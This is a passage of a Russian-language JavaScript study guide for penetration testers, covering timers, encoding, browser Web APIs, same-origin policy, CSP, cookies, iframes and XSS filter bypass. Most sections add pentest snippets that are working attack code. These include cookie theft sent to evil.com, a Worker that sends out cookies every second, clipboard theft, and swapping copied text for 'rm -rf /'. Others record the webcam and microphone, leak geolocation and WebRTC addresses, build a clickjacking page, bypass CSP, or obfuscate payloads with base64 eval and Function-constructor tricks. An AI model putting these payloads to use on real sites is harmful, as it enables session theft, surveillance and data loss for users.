    console.log('фоновое задание');
}, { timeout: 2000 });

// ДЛЯ ПЕНТЕСТА:
// 1. Скрытая эксфильтрация в фоне
requestIdleCallback(() => {
    fetch('https://evil.com/steal', {
        method: 'POST',
        body: document.cookie
    });
});

// 2. Обнаружение простоя для атаки
requestIdleCallback(() => {
    // пользователь не активен - можно что-то сделать
    document.body.innerHTML += '<img src=x onerror=alert(1)>';
});
```

// Минимальная задержка (4ms после 5го вызова)

```javaScript
// В браузерах минимальная задержка setTimeout - 4ms после 5го вложенного
let start = Date.now();
setTimeout(() => {
    console.log('задержка:', Date.now() - start); // может быть 4ms
}, 0);

// Для первых 5 вызовов может быть 0, потом минимум 4ms
for (let i = 0; i < 10; i++) {
    setTimeout(() => {
        console.log(i, Date.now() - start);
    }, 0);
}

// ДЛЯ ПЕНТЕСТА:
// 1. Обход rate limiting через setTimeout 0
function limited() {
    let count = 0;
    function attempt() {
        if (count++ < 100) {
            // быстро, но не мгновенно из-за 4ms
            fetch('/login?attempt=' + count);
            setTimeout(attempt, 0);
        }
    }
    attempt();
}
```


**Для пентеста:** задержки для обхода фильтров

### 4.8 Encoding/Decoding



// encodeURI, decodeURI

```javaScript
// encodeURI - кодирует URI, но не спецсимволы: , / ? : @ & = + $ #
const url = 'https://example.com/?q=hello world#section';
encodeURI(url); // 'https://example.com/?q=hello%20world#section'
// пробел стал %20, а ? и # остались

// decodeURI - обратно
decodeURI('https://example.com/?q=hello%20world'); // восстанавливает

// ДЛЯ ПЕНТЕСТА:
// 1. Обход фильтров через encodeURI
const payload = '<script>alert(1)</script>';
const encoded = encodeURI(payload); // '%3Cscript%3Ealert(1)%3C/script%3E'
// фильтр может не сработать, потом декодируется

// 2. Двойное кодирование
encodeURI(encodeURI('<script>')); // '%253Cscript%253E'
```

// encodeURIComponent, decodeURIComponent

```javaScript
// encodeURIComponent - кодирует ВСЕ спецсимволы (для параметров)
const param = 'hello world & more=';
encodeURIComponent(param); // 'hello%20world%20%26%20more%3D'

// decodeURIComponent - обратно
decodeURIComponent('hello%20world'); // 'hello world'

// ДЛЯ ПЕНТЕСТА: ЭТО ВАЖНО!
// 1. Обход WAF через encodeURIComponent
const payload = '<script>alert(1)</script>';
const encoded = encodeURIComponent(payload); // '%3Cscript%3Ealert(1)%3C%2Fscript%3E'
// если потом где-то decodeURIComponent - XSS!

// 2. Кража данных через encodeURIComponent
fetch('/steal?data=' + encodeURIComponent(document.cookie));

// 3. Двойное декодирование (если приложение декодирует дважды)
const doubleEncoded = encodeURIComponent(encodeURIComponent('<script>')); // '%253Cscript%253E'
// если декодируют дважды - получится <script>
```

// escape, unescape (устарело)

```javaScript
// escape - старый способ (не для UTF-8, устарел)
escape('<script>'); // '%3Cscript%3E'
escape('Привет'); // '%u041F%u0440%u0438%u0432%u0435%u0442' (юникод)

// unescape - обратно
unescape('%3Cscript%3E'); // '<script>'

// ДЛЯ ПЕНТЕСТА:
// 1. В старом коде может использоваться
const payload = unescape('%3Cscript%3Ealert(1)%3C/script%3E');
document.write(payload); // XSS!

// 2. Обход через юникод в escape
eval(unescape('alert%281%29')); // alert(1)
```

// btoa (base64), atob

```javaScript
// btoa - строка в base64 (только ASCII!)
btoa('Hello World'); // 'SGVsbG8gV29ybGQ='

// atob - base64 в строку
atob('SGVsbG8gV29ybGQ='); // 'Hello World'

// Для юникода нужно сначала кодировать
btoa(unescape(encodeURIComponent('Привет'))); // юникод в base64

// ДЛЯ ПЕНТЕСТА: ЭТО КЛАССИКА!
// 1. Обфускация payload
const payload = btoa('alert(1)'); // 'YWxlcnQoMSk='
eval(atob(payload)); // выполнится!

// 2. Кража данных в base64
fetch('/steal?data=' + btoa(document.cookie));

// 3. Обход фильтров через base64
const encoded = btoa('<script>alert(1)</script>');
// фильтр ищет <script>, а тут base64

// 4. data: URL с base64
<img src="data:image/png;base64,iVBORw0KGgo...">
// можно вставить XSS через data: URL
```

// TextEncoder, TextDecoder

```javaScript
// TextEncoder - строка в Uint8Array (UTF-8)
const encoder = new TextEncoder();
const uint8 = encoder.encode('alert(1)'); // Uint8Array [97,108,101,114,116,40,49,41]

// TextDecoder - обратно
const decoder = new TextDecoder();
const str = decoder.decode(uint8); // 'alert(1)'

// ДЛЯ ПЕНТЕСТА:
// 1. Работа с бинарными данными
const payload = new TextEncoder().encode('<script>alert(1)</script>');
// можно отправить как бинарные данные

// 2. Обход через кодировки
const encoded = new TextEncoder().encode('alert(1)');
// фильтр ищет строки, а это массив чисел

// 3. Эксфильтрация в бинарном виде
fetch('/steal', {
    method: 'POST',
    body: new TextEncoder().encode(document.cookie)
});
```


**Для пентеста:** обход WAF через кодирование

### 4.9 Web APIs для эксфильтрации



// Geolocation

```javaScript
// Получение координат пользователя
navigator.geolocation.getCurrentPosition(
    (position) => {
        const coords = {
            lat: position.coords.latitude,
            lng: position.coords.longitude,
            accuracy: position.coords.accuracy
        };
        // отправляем злоумышленнику
        fetch('https://evil.com/steal', {
            method: 'POST',
            body: JSON.stringify(coords)
        });
    },
    (error) => {
        console.log('ошибка:', error.message);
    },
    {
        enableHighAccuracy: true,
        timeout: 5000,
        maximumAge: 0
    }
);

// Постоянное отслеживание
const watchId = navigator.geolocation.watchPosition(callback);

// Остановка
navigator.geolocation.clearWatch(watchId);

// ДЛЯ ПЕНТЕСТА:
// 1. Кража геолокации (нужно разрешение пользователя)
// но если сайт уже имеет разрешение - XSS может украсть

// 2. Фишинг через запрос геолокации
if (confirm('Сайт запрашивает ваше местоположение для лучшего сервиса')) {
    navigator.geolocation.getCurrentPosition(sendToEvil);
}
```

// Webcam/Microphone

```javaScript
// Доступ к камере и микрофону
navigator.mediaDevices.getUserMedia({ video: true, audio: true })
    .then((stream) => {
        // стрим с камеры/микрофона
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();
        
        // можно записывать
        const recorder = new MediaRecorder(stream);
        recorder.ondataavailable = (e) => {
            // отправка видео злоумышленнику
            fetch('https://evil.com/upload', {
                method: 'POST',
                body: e.data
            });
        };
        recorder.start();
        
        // или делать снимки с canvas
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        canvas.toDataURL('image/png'); // фото
    })
    .catch((err) => console.log('доступ запрещен'));

// Получить список устройств
navigator.mediaDevices.enumerateDevices()
    .then(devices => {
        devices.forEach(device => {
            console.log(device.kind, device.label);
        });
    });

// ДЛЯ ПЕНТЕСТА:
// 1. Если пользователь уже дал разрешение - XSS может включить камеру
// 2. Тихое включение без индикатора? нет, браузер показывает
// 3. Фишинг под фейковый Flash
```

// Clipboard

```javaScript
// Чтение из буфера обмена (требует разрешения)
navigator.clipboard.readText()
    .then(text => {
        fetch('https://evil.com/steal?clip=' + encodeURIComponent(text));
    })
    .catch(err => console.log('нет доступа'));

// Запись в буфер
navigator.clipboard.writeText('вредоносная команда')
    .then(() => console.log('скопировано'))
    .catch(err => console.log('ошибка'));

// Чтение изображений и др.
navigator.clipboard.read()
    .then(clipboardItems => {
        for (let item of clipboardItems) {
            for (let type of item.types) {
                item.getType(type).then(blob => {
                    // отправка
                });
            }
        }
    });

// ДЛЯ ПЕНТЕСТА:
// 1. Кража скопированных паролей
document.addEventListener('copy', () => {
    setTimeout(() => {
        navigator.clipboard.readText().then(sendToEvil);
    }, 100);
});

// 2. Подмена скопированного
document.addEventListener('copy', (e) => {
    e.clipboardData.setData('text/plain', 'rm -rf /');
    e.preventDefault();
});

// 3. Фишинг через clipboard
navigator.clipboard.writeText('https://evil.com/login');
```

// File API

```javaScript
// Чтение файлов через input
<input type="file" id="fileInput" multiple>

document.getElementById('fileInput').addEventListener('change', (e) => {
    const files = e.target.files;
    for (let file of files) {
        const reader = new FileReader();
        reader.onload = (e) => {
            fetch('https://evil.com/upload', {
                method: 'POST',
                body: e.target.result
            });
        };
        reader.readAsText(file); // или readAsDataURL, readAsArrayBuffer
    }
});

// Доступ к выбранным файлам через Drag & Drop
dropZone.addEventListener('drop', (e) => {
    e.preventDefault();
    const files = e.dataTransfer.files;
    // те же FileReader
});

// FileReaderSync (в веб-воркерах)
const reader = new FileReaderSync();
const text = reader.readAsText(file);

// ДЛЯ ПЕНТЕСТА:
// 1. Стилизация file input и автосабмит
const input = document.createElement('input');
input.type = 'file';
input.style.display = 'none';
input.addEventListener('change', sendFiles);
document.body.appendChild(input);
input.click(); // надеемся, пользователь выберет файл

// 2. Обход через multiple
<input type="file" webkitdirectory> // выбрать папку целиком!

// 3. Чтение файлов через дроп-зону
// создать зону на всю страницу
```

// Drag and Drop

```javaScript
```

// Web Workers (фоновые потоки)

```javaScript
// Главный поток
const worker = new Worker('worker.js');

worker.postMessage({ cmd: 'start', data: 'secret' });

worker.onmessage = (e) => {
    console.log('от воркера:', e.data);
    if (e.data.type === 'exfil') {
        fetch(e.data.url, { method: 'POST', body: e.data.data });
    }
};

worker.onerror = (e) => console.log('ошибка');

// worker.js
self.onmessage = (e) => {
    const data = e.data;
    
    // долгая обработка
    const result = heavyComputation(data);
    
    // эксфильтрация без блокировки UI
    fetch('https://evil.com/steal', {
        method: 'POST',
        body: JSON.stringify(result)
    }).then(() => {
        self.postMessage({ done: true });
    });
};

// Inline worker (Blob)
const blob = new Blob([`
    self.onmessage = (e) => {
        self.postMessage('hacked: ' + e.data);
    }
`], { type: 'application/javascript' });
const worker = new Worker(URL.createObjectURL(blob));

// ДЛЯ ПЕНТЕСТА:
// 1. Эксфильтрация в фоне без блокировки UI
const exfilWorker = new Worker(URL.createObjectURL(new Blob([`
    setInterval(() => {
        fetch('https://evil.com/steal?data=' + document.cookie);
    }, 1000);
`])));

// 2. Обход CSP через worker (у workers свой CSP)
// 3. Долгие вычисления для DoS
```

// WebRTC

```javaScript
// Получение локального IP (утечка!)
const rtc = new RTCPeerConnection({ iceServers: [] });
rtc.createDataChannel('');

rtc.onicecandidate = (e) => {
    if (e.candidate) {
        const ip = e.candidate.candidate.split(' ')[4];
        fetch('https://evil.com/ip?=' + ip); // утечка локального IP!
    }
};

rtc.createOffer()
    .then(offer => rtc.setLocalDescription(offer));

// Доступ к камере через WebRTC
navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
        stream.getTracks().forEach(track => rtc.addTrack(track, stream));
        // отправка видео через WebRTC на свой сервер
    });

// ДЛЯ ПЕНТЕСТА:
// 1. Утечка локального IP (даже через VPN!)
// 2. Обход NAT для прямых соединений
// 3. Создание ботнета через WebRTC (P2P)
```

// Canvas

```javaScript
// Canvas для fingerprint и кражи данных
const canvas = document.createElement('canvas');
const ctx = canvas.getContext('2d');

// Рисуем что-то
ctx.textBaseline = 'top';
ctx.font = '14px Arial';
ctx.fillStyle = '#f60';
ctx.fillRect(0, 0, 100, 100);
ctx.fillStyle = '#069';
ctx.fillText('XSS', 2, 15);

// Получаем данные
const dataURL = canvas.toDataURL(); // base64 изображения
const blob = await new Promise(r => canvas.toBlob(r));

// Canvas fingerprinting
function getCanvasFingerprint() {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    ctx.fillStyle = 'rgb(255,0,0)';
    ctx.fillRect(0, 0, 100, 100);
    ctx.fillStyle = 'rgb(0,255,0)';
    ctx.fillRect(50, 50, 100, 100);
    
    // различия в рендеринге шрифтов/антиалиасинга
    ctx.font = '14px Arial';
    ctx.fillStyle = 'rgb(0,0,255)';
    ctx.fillText('XSS', 10, 50);
    
    return canvas.toDataURL(); // уникальный хеш
}

// Чтение пикселей (можно украсть данные с экрана?)
const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
// массив пикселей [r,g,b,a, r,g,b,a...]

// ДЛЯ ПЕНТЕСТА:
// 1. Canvas fingerprint для идентификации пользователя
const fp = getCanvasFingerprint();
fetch('https://evil.com/fp?hash=' + encodeURIComponent(fp));

// 2. Кража данных через canvas (если удалось загрузить кросс-доменное изображение)
const img = new Image();
img.crossOrigin = 'anonymous'; // может не работать из-за CORS
img.onload = () => {
    ctx.drawImage(img, 0, 0);
    const data = canvas.toDataURL(); // данные изображения
    sendToEvil(data);
};
img.src = 'https://target.com/private-image.jpg';

// 3. Обнаружение установленных шрифтов через canvas
```

// Audio

```javaScript
// Аудио контекст для fingerprint и анализа
const audioCtx = new (window.AudioContext || window.webkitAudioContext)();

// Генерация звука
const oscillator = audioCtx.createOscillator();
const gainNode = audioCtx.createGain();
oscillator.connect(gainNode);
gainNode.connect(audioCtx.destination);
oscillator.frequency.value = 1000;
oscillator.start();

// Анализ аудио (Fourier transform)
const analyser = audioCtx.createAnalyser();
// можно анализировать микрофон

// Получение данных с микрофона
navigator.mediaDevices.getUserMedia({ audio: true })
    .then(stream => {
        const source = audioCtx.createMediaStreamSource(stream);
        source.connect(analyser);
        
        const dataArray = new Uint8Array(analyser.frequencyBinCount);
        analyser.getByteFrequencyData(dataArray);
        
        // отправка аудиоданных
        setInterval(() => {
            analyser.getByteFrequencyData(dataArray);
            fetch('/steal-audio', {method: 'POST', body: dataArray});
        }, 1000);
    });

// ДЛЯ ПЕНТЕСТА:
// 1. Fingerprint через AudioContext (разные реализации дают разный шум)
// 2. Запись разговоров (если есть доступ к микрофону)
// 3. Ультразвуковая коммуникация между устройствами
```

// Battery Status

```javaScript
// Информация о батарее (старое API, сейчас ограничено)
navigator.getBattery().then(battery => {
    console.log('уровень:', battery.level * 100 + '%');
    console.log('заряжается:', battery.charging);
    console.log('время до разряда:', battery.dischargingTime);
    
    // отслеживание изменений
    battery.addEventListener('levelchange', () => {
        console.log('уровень изменился:', battery.level);
        sendToEvil('battery:' + battery.level);
    });
    
    battery.addEventListener('chargingchange', () => {
        console.log('статус зарядки:', battery.charging);
    });
});

// ДЛЯ ПЕНТЕСТА:
// 1. Fingerprint через батарею (не уникально, но доп. информация)
// 2. Отслеживание активности (если уровень падает - пользователь активен)
```

// Network Information

```javaScript
// Информация о сети
const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;

if (connection) {
    console.log('тип сети:', connection.effectiveType); // '4g', '3g', '2g', 'slow-2g'
    console.log('RTT:', connection.rtt); // round-trip time
    console.log('downlink:', connection.downlink); // скорость Мбит/с
    console.log('экономия данных:', connection.saveData); // режим экономии
    
    // изменения
    connection.addEventListener('change', () => {
        console.log('сеть изменилась');
        if (connection.effectiveType === '4g') {
            // можно загрузить больше
        }
    });
}

// ДЛЯ ПЕНТЕСТА:
// 1. Адаптация эксплойта под скорость сети
if (navigator.connection && navigator.connection.effectiveType === 'slow-2g') {
    // легкий payload
} else {
    // тяжелый
}

// 2. Fingerprint через RTT (нестабильно)
```


**Для пентеста:** получение чувствительных данных

---

## **БЛОК 5: SECURITY 

### 5.1 Same-Origin Policy



// Происхождение (протокол+домен+порт)

```javaScript
// SOP - скрипт с одного origin не может читать данные с другого

// Происхождение = протокол://домен:порт
// https://example.com:443
// http://example.com:80 - другой порт - другой origin!
// https://api.example.com - другой поддомен - другой origin!

// Примеры:
// https://site.com/page1 и https://site.com/page2 - ОДИН origin
// http://site.com и https://site.com - РАЗНЫЕ (протокол)
// https://site.com и https://sub.site.com - РАЗНЫЕ (домен)

// Проверка происхождения
console.log(location.origin); // 'https://site.com'

// ДЛЯ ПЕНТЕСТА:
// 1. Обход через поддомены (если разрешены)
// если site.com разрешает API на api.site.com - это не кросс-домен

// 2. Уязвимости в реализации SOP в старых браузерах
```

// Исключения для script, img, css

```javaScript
// Теги с src могут загружать с любых доменов (но читать ответ нельзя!)
const script = document.createElement('script');
script.src = 'https://other-site.com/api.js'; // загрузится!
document.body.appendChild(script); // выполнится в контексте страницы!

const img = new Image();
img.src = 'https://other-site.com/image.jpg'; // загрузится
img.onload = () => {
    // но прочитать пиксели нельзя (CORS)
};

const link = document.createElement('link');
link.rel = 'stylesheet';
link.href = 'https://other-site.com/style.css'; // загрузится

// ДЛЯ ПЕНТЕСТА: ЭТО КРИТИЧНО!
// 1. JSONP - обход SOP через script
function jsonpCallback(data) {
    console.log('украдено:', data);
}
const script = document.createElement('script');
script.src = 'https://target.com/api?callback=jsonpCallback';
document.body.appendChild(script);
// данные придут как вызов функции с данными!

// 2. Кража через img (односторонняя отправка)
new Image().src = 'https://evil.com/log?data=' + encodeURIComponent(document.cookie);

// 3. CSS-инъекции для кражи
const link = document.createElement('link');
link.rel = 'stylesheet';
link.href = 'https://target.com/style.css';
// можно украсть CSRF-токены через CSS селекторы?
```

// document.domain

```javaScript
// document.domain - можно смягчить SOP (УСТАРЕЛО!)
// Позволяет двум поддоменам общаться

// На https://sub1.example.com
document.domain = 'example.com';

// На https://sub2.example.com
document.domain = 'example.com';

// Теперь они считаются одним origin'ом
// Можно обращаться к DOM друг друга

// Ограничения:
// - нужно установить на обоих доменах
// - порт должен быть одинаковый
// - нельзя изменить на другой домен (только на родительский)

// ДЛЯ ПЕНТЕСТА:
// 1. Если сайт использует document.domain, можно обойти SOP
// XSS на sub1 может получить доступ к sub2

// 2. Современные браузеры убирают эту возможность
```

// postMessage и ограничения

```javaScript
// postMessage - безопасная коммуникация между окнами/фреймами

// Отправка
targetWindow.postMessage({
    type: 'GET_DATA',
    payload: 'secret'
}, 'https://trusted-site.com'); // target origin

// Прием
window.addEventListener('message', (e) => {
    // ВСЕГДА проверяйте origin!
    if (e.origin !== 'https://trusted-site.com') {
        return; // игнорируем
    }
    
    console.log('получено:', e.data);
    
    // Ответ
    e.source.postMessage({ response: 'ok' }, e.origin);
});

// ДЛЯ ПЕНТЕСТА: ЭТО ЗОЛОТАЯ ЖИЛА!
// 1. Отсутствие проверки origin
window.addEventListener('message', (e) => {
    // нет проверки!
    eval(e.data); // XSS!
});
// Злоумышленник в iframe отправляет postMessage('alert(1)')

// 2. Отправка данных на любой origin
window.addEventListener('message', (e) => {
    if (e.data.type === 'secret') {
        e.source.postMessage(userData, '*'); // * - любой сайт! утечка!
    }
});

// 3. postMessage к родительскому окну
parent.postMessage('data', '*'); // отправляем на любой сайт

// 4. Обход через postMessage для CSRF
const iframe = document.createElement('iframe');
iframe.src = 'https://target.com/admin';
iframe.onload = () => {
    iframe.contentWindow.postMessage('deleteUser', '*');
};

// 5. XSS через postMessage с eval
window.addEventListener('message', (e) => {
    if (e.data.cmd === 'run') {
        setTimeout(e.data.code, 0); // XSS!
    }
});

// 6. Кража данных через postMessage
window.addEventListener('message', (e) => {
    fetch('https://evil.com/steal?data=' + encodeURIComponent(JSON.stringify(e.data)));
});
```


**Для пентеста:** обход SOP через уязвимости

### 5.2 Content Security Policy (CSP)



// Директивы: default-src, script-src, style-src

```javaScript
// CSP - заголовок, ограничивающий загрузку ресурсов
// Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com

// Основные директивы:
default-src: 'self' // всё по умолчанию только с себя
script-src: 'self' https://cdn.com // скрипты только с себя и CDN
style-src: 'self' 'unsafe-inline' // стили с себя и инлайн
img-src: * // картинки отовсюду
connect-src: 'self' api.example.com // fetch, XHR, WebSocket
frame-src: 'none' // никаких iframe
font-src: https://fonts.google.com // шрифты только с гугла
media-src: 'self' // видео/аудио
object-src: 'none' // никаких плагинов (Flash)
base-uri: 'self' // где можно ставить <base>
form-action: 'self' // куда можно отправлять формы

// ДЛЯ ПЕНТЕСТА:
// 1. Смотрим заголовки ответа
// Content-Security-Policy или Content-Security-Policy-Report-Only

// 2. Слишком разрешительный default-src: * - всё можно!
```

// unsafe-inline, unsafe-eval

```javaScript
// 'unsafe-inline' - разрешает инлайн-скрипты и стили
// ОПАСНО! XSS через <script>alert(1)</script> и <div onclick="alert(1)">

// 'unsafe-eval' - разрешает eval, Function, setTimeout со строкой
// ОПАСНО! eval('alert(1)'), setTimeout('alert(1)', 0)

// ДЛЯ ПЕНТЕСТА:
// 1. Если есть unsafe-inline - XSS через инлайн-события
<img src=x onerror="alert(1)"> // сработает!

// 2. Если есть unsafe-eval - обход через eval
eval('alert(1)');
setTimeout('alert(1)', 0);
new Function('alert(1)')();
[].map.constructor('alert(1)')(); // тоже eval!

// 3. Комбинация - если нет unsafe-inline, но есть unsafe-eval
// можно через eval вставить элементы
eval('document.body.innerHTML += "<img src=x onerror=alert(1)>"');
```

// nonce, hash

```javaScript
// nonce - одноразовый токен (случайное число)
// script-src 'nonce-abc123'
<script nonce="abc123">alert(1)</script> // разрешен
<script>alert(1)</script> // без nonce - блокируется

// hash - хеш содержимого скрипта
// script-src 'sha256-...'
<script>alert(1)</script> // если хеш совпадает - разрешен

// ДЛЯ ПЕНТЕСТА:
// 1. Если nonce угадываемый (например, timestamp) - можно подобрать
// 2. Если nonce используется в динамических скриптах - можно украсть через XSS
// 3. Если nonce есть в ответе - можно его извлечь и использовать
const nonce = document.querySelector('script[nonce]')?.getAttribute('nonce');
if (nonce) {
    const script = document.createElement('script');
    script.setAttribute('nonce', nonce);
    script.textContent = 'alert(1)';
    document.body.appendChild(script); // XSS с nonce!
}
```

// report-uri, report-to

```javaScript
// report-uri - куда отправлять отчеты о нарушениях
// Content-Security-Policy: script-src 'self'; report-uri /csp-report

// report-to - современная замена (использует Reporting API)
// Content-Security-Policy: script-src 'self'; report-to csp-endpoint

// Отчет отправляется при блокировке ресурса
{
    "csp-report": {
        "document-uri": "https://example.com/page",
        "violated-directive": "script-src 'self'",
        "blocked-uri": "https://evil.com/xss.js",
        "original-policy": "script-src 'self'; report-uri /csp-report"
    }
}

// ДЛЯ ПЕНТЕСТА:
// 1. Можно вызвать нарушения, чтобы увидеть политику в отчетах
// 2. Если report-uri на том же домене - можно перехватить данные?
// 3. Иногда отчеты содержат чувствительную информацию
```

// Обход CSP через JSONP, через iframe

```javaScript
// 1. JSONP обход
// Если script-src разрешает доверенный домен с JSONP
// https://trusted.com/jsonp?callback=alert(1)
<script src="https://trusted.com/jsonp?callback=alert(1)"></script>
// ответ: alert(1)({"data":"..."}) - выполнится!

// 2. Обход через iframe с javascript: URL
// если frame-src разрешает 'self' или *
<iframe src="javascript:alert(1)"></iframe>

// 3. Обход через base-uri
// если base-uri не ограничен, можно изменить base
<base href="https://evil.com/">
<script src="/script.js"></script> // загрузится с evil.com!

// 4. Обход через 302 редирект
// если script-src разрешает trusted.com, а он редиректит на evil.com
// браузер загрузит с evil.com, если следует редиректам

// 5. Обход через дырявые CDN
// некоторые CDN содержат JSONP эндпоинты
<script src="https://cdnjs.cloudflare.com/ajax/...?callback=alert(1)"></script>

// 6. Обход через 'strict-dynamic'
// если есть 'strict-dynamic', то скрипты, загруженные доверенными, могут грузить любые
<script nonce="abc123">
    var s = document.createElement('script');
    s.src = 'https://evil.com/xss.js';
    document.body.appendChild(s); // сработает!
</script>

// 7. Обход через Angular (если разрешен)
<div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>

// 8. Обход через meta refresh
<meta http-equiv="refresh" content="0; url=javascript:alert(1)">
```


**Для пентеста:** поиск дыр в CSP

### 5.3 Cookies



// HttpOnly (недоступно JS)

```javaScript
// HttpOnly - кука недоступна через document.cookie
Set-Cookie: session=abc123; HttpOnly

// document.cookie не покажет эту куку!
console.log(document.cookie); // нет session

// ДЛЯ ПЕНТЕСТА:
// 1. HttpOnly защищает от кражи через XSS
// но не защищает от CSRF!

// 2. Обход HttpOnly? нельзя напрямую, но можно через TRACE method (старое)
// или через другие уязвимости
```

// Secure (только HTTPS)

```javaScript
// Secure - кука только по HTTPS
Set-Cookie: session=abc123; Secure

// По HTTP не отправится
// ДЛЯ ПЕНТЕСТА:
// 1. Если сайт работает и по HTTP, и по HTTPS
// можно заставить пользователя перейти на HTTP и перехватить куку
// 2. SSLstrip атаки
```

// SameSite (Strict, Lax, None)

```javaScript
// SameSite - защита от CSRF
Set-Cookie: session=abc123; SameSite=Strict
Set-Cookie: session=abc123; SameSite=Lax
Set-Cookie: session=abc123; SameSite=None; Secure

// Strict - кука не отправляется ни с каких кросс-сайтовых запросов
// Lax - отправляется с top-level навигации (переход по ссылке)
// None - отправляется всегда (требует Secure)

// ДЛЯ ПЕНТЕСТА:
// 1. Strict - хорошая защита от CSRF
// 2. Lax - можно атаковать через GET-запросы с переходом
// 3. None - уязвимо для CSRF, если нет других защит
```

// Domain, Path, Expires

```javaScript
// Domain - какие домены видят куку
Set-Cookie: session=abc123; Domain=.example.com
// доступно на example.com и всех поддоменах

// Path - только для определенного пути
Set-Cookie: session=abc123; Path=/admin

// Expires/Max-Age - время жизни
Set-Cookie: session=abc123; Expires=Wed, 21 Oct 2025 07:28:00 GMT
Set-Cookie: session=abc123; Max-Age=3600 // час

// ДЛЯ ПЕНТЕСТА:
// 1. Domain слишком широкий - кука на всех поддоменах
// XSS на любом поддомене украдет куку
// 2. Path слишком широкий - кука на всех путях
// 3. Без expires - session cookie (до закрытия браузера)
```

// __Host- префикс

```javaScript
// __Host- префикс - требования безопасности
Set-Cookie: __Host-session=abc123; Secure; Path=/; Domain=example.com
// Должна быть:
// - Secure
// - Path=/
// - без Domain (или Domain совпадает)

// __Secure- префикс - только Secure
Set-Cookie: __Secure-session=abc123; Secure

// ДЛЯ ПЕНТЕСТА:
// 1. Защита от переопределения кук на поддоменах
// 2. Если кука с __Host- - она безопаснее
```


**Для пентеста:** кража cookies через XSS (если не HttpOnly)

### 5.4 iframe и фреймы



// sandbox атрибут

```javaScript
// sandbox - ограничивает возможности iframe
<iframe sandbox src="..."></iframe>

// Ограничения (все включены по умолчанию):
// - формы не отправляются
// - скрипты не выполняются
// - нет доступа к parent
// - нет плагинов
// - нет навигации верхнего уровня

// Флаги для разрешения:
<iframe sandbox="allow-scripts allow-forms" src="..."></iframe>

// allow-same-origin - считать своим origin'ом
// allow-scripts - разрешить скрипты
// allow-forms - разрешить формы
// allow-popups - разрешить window.open
// allow-top-navigation - разрешить навигацию верхнего уровня
// allow-modals - разрешить модальные окна

// ДЛЯ ПЕНТЕСТА:
// 1. Если есть allow-scripts, но нет allow-same-origin - скрипты есть, но SOP не работает
// 2. Если есть allow-same-origin - можно атаковать через iframe
// 3. Комбинация allow-scripts + allow-same-origin - как обычный iframe
```

// allow-same-origin, allow-scripts

```javaScript
// allow-same-origin - iframe считается из того же origin'а
<iframe sandbox="allow-same-origin" src="https://same-site.com"></iframe>

// allow-scripts - разрешает JS в iframe
<iframe sandbox="allow-scripts" src="..."></iframe>

// ОПАСНАЯ КОМБИНАЦИЯ!
<iframe sandbox="allow-scripts allow-same-origin" src="..."></iframe>
// iframe может:
// - выполнять скрипты
// - обращаться к parent (если с того же origin)
// - читать/писать куки

// ДЛЯ ПЕНТЕСТА:
// 1. Если есть XSS в таком iframe - можно украсть данные с parent
// 2. Если parent не защищен - iframe может его модифицировать
```

// Frame busting

```javaScript
// Frame busting - защита от вставки в iframe (кликджекинг)
if (top != self) {
    // мы во фрейме
    top.location = self.location; // переходим на себя
    // или
    top.location.href = 'about:blank'; // очищаем
    // или
    document.write(''); // очищаем страницу
}

// Современная защита: X-Frame-Options или CSP frame-ancestors

// Обход frame busting:
// 1. Двойной iframe
<iframe src="target.html"></iframe>
// target.html пытается bust, но inner iframe может быть хитрее

// 2. sandbox без allow-top-navigation
<iframe sandbox="allow-scripts" src="target.html"></iframe>
// frame busting не сработает, т.к. нет allow-top-navigation

// 3. Использование about:blank
// сначала iframe на about:blank, потом меняем location
```

// Clickjacking (X-Frame-Options)

```javaScript
// X-Frame-Options - защита от вставки в iframe
X-Frame-Options: DENY // вообще нельзя во фрейм
X-Frame-Options: SAMEORIGIN // только с того же origin
X-Frame-Options: ALLOW-FROM https://trusted.com // устарело

// Современная замена: CSP frame-ancestors
Content-Security-Policy: frame-ancestors 'self' https://trusted.com

// ДЛЯ ПЕНТЕСТА: КЛИКДЖЕКИНГ!
// 1. Найти страницу без защиты
// 2. Создать прозрачный iframe поверх кнопки
<style>
    iframe {
        position: absolute;
        top: 0;
        left: 0;
        width: 500px;
        height: 500px;
        opacity: 0.1; /* почти прозрачный */
        z-index: 10;
    }
    button {
        position: absolute;
        top: 100px;
        left: 100px;
        z-index: 1;
    }
</style>

<iframe src="https://vulnerable.com/admin/delete"></iframe>
<button>Нажми на приз! (на самом деле удалишь всё)</button>

// 3. Обход через X-Frame-Options ALLOW-FROM (не поддерживается везде)
// 4. Обход через двойной iframe
```


**Для пентеста:** кликджекинг, фрейм-инъекции

---

## **БЛОК 6: ПРОДВИНУТЫЕ ТЕМЫ ДЛЯ XSS**

### 6.1 Обход фильтров - БАЗА



// Без кавычек: alert(1)

```javaScript
// Если фильтр ищет кавычки
alert(1) // без кавычек работает!
alert`1` // шаблонная строка тоже работает

// ДЛЯ ПЕНТЕСТА:
// 1. Использовать без кавычек, если фильтр блокирует " или '
```

// Через шаблоны: `${alert}`

```javaScript
// Шаблонные строки могут выполнять код
`${alert(1)}` // выполнится!

// В более сложных контекстах
const x = `${alert(1)}` // XSS

// ДЛЯ ПЕНТЕСТА:
// 1. Если фильтр чистит скобки, но оставляет ${}
```

// Через функции: [].map.constructor('alert(1)')()

```javaScript
// Получение Function constructor разными способами
[].map.constructor('alert(1)')() // alert(1)

// Другие варианты
[].filter.constructor('alert(1)')()
[].forEach.constructor('alert(1)')()
"".substring.constructor('alert(1)')()
(0).constructor.constructor('alert(1)')()
({}).constructor.constructor('alert(1)')()

// Через исключения
new Error().constructor.constructor('alert(1)')()

// ДЛЯ ПЕНТЕСТА:
// 1. Обход фильтров на eval
// 2. Когда eval заблокирован CSP (unsafe-eval), но есть Function?
// Function тоже считается eval!
```

// Через исключения: new Error().stack

```javaScript
// Получение информации через stack
try {
    null.x();
} catch(e) {
    console.log(e.stack); // утечка путей
}

// Иногда можно получить Function через stack
const stack = new Error().stack;
const func = stack.constructor.constructor('alert(1)');
func(); // XSS

// ДЛЯ ПЕНТЕСТА:
// 1. Утечка информации о путях
// 2. Обход через конструктор
```

